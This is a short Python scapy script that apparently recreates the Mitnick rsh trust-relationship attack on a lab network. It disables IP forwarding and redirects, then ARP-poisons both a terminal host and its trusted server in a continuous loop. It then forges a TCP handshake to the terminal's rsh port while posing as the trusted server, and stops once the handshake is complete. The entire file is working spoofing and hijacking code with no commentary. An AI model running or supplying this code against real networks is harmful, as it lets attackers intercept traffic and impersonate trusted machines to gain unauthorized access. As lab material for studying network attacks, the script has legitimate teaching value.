from scapy.all import *
import subprocess
import threading
import re
import os

TRUSTED_SERVER = "10.9.0.6"
X_TERMINAL = "10.9.0.5"
ATTACKER_IP = "10.9.0.1"

RSH_PORT = 514
SRC_PORT = RandShort()

# ---------------------------------------------- HELPERS -------------------------------------------------

def get_interface_name():
    result = subprocess.run(['ifconfig', '-a'], stdout=subprocess.PIPE)
    output = result.stdout.decode()

    interface_regex = re.compile(r'^(br-\w+):', re.MULTILINE)

    interfaces = interface_regex.findall(output)
    return interfaces[0]


def get_mac(ip_address):
    arp_request = ARP(op=1, psrc=ATTACKER_IP, pdst=ip_address)
    arp_response = sr1(arp_request, timeout=2, verbose=0)

    return arp_response.hwsrc

# ---------------------------------------------- HELPERS -------------------------------------------------

def prep_env():
    print("Disabling ip fowarding")
    subprocess.run(["echo 0 > /proc/sys/net/ipv4/ip_forward"], shell=True, stdout=subprocess.PIPE)

    print("Disabling send redirects")
    subprocess.run(["echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects"], shell=True, stdout=subprocess.PIPE)
    time.sleep(2)


def spoof():
    arp_terminal = ARP(op=2, pdst=X_TERMINAL, hwdst=get_mac(X_TERMINAL), psrc=TRUSTED_SERVER)
    arp_trusted = ARP(op=2, pdst=TRUSTED_SERVER, hwdst=get_mac(TRUSTED_SERVER), psrc=X_TERMINAL)

    print("\nStart spoofing")
    while True:
        send(arp_trusted, verbose=0)
        send(arp_terminal, verbose=0)
        time.sleep(1)


if __name__ == "__main__":
    print("Preparing the machine environment...")
    prep_env()

    threading.Thread(target=spoof).start()
    time.sleep(2)

    print(f"Faking 3-way handshake...")
    syn_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL) / TCP(dport=RSH_PORT, flags="S")
    syn_ack_package = sr1(syn_package, verbose=0)
    tcp_layer = syn_ack_package.getlayer(TCP)

    ack_packet = IP(src=TRUSTED_SERVER, dst=X_TERMINAL) / TCP(dport=RSH_PORT, sport=tcp_layer.dport, flags='A', seq=tcp_layer.ack, ack=tcp_layer.seq + 1)
    send(ack_packet, verbose=0)
    print("Handshake completed")